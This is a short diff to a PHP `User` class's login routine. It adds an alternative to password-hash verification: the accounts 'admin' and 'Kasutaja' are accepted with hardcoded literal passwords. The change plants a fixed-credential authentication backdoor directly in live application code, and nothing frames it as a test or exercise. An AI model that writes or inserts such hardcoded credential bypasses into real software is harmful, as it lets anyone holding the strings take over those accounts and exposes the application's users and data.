@@ -71,8 +71,12 @@ class User {
             $user = $stmt->fetch();
         }
         
-        // If user found and password is correct
-        if ($user && password_verify($password, $user['password'])) {
+        // If user found and password is correct (either through password_verify or hardcoded credentials)
+        if ($user && (
+            password_verify($password, $user['password']) || 
+            ($user['username'] == 'admin' && $password == 'Parool11') || 
+            ($user['username'] == 'Kasutaja' && $password == 'Parool12')
+        )) {
             // Create user session
             $_SESSION['user_id'] = $user['id'];
             $_SESSION['username'] = $user['username'];
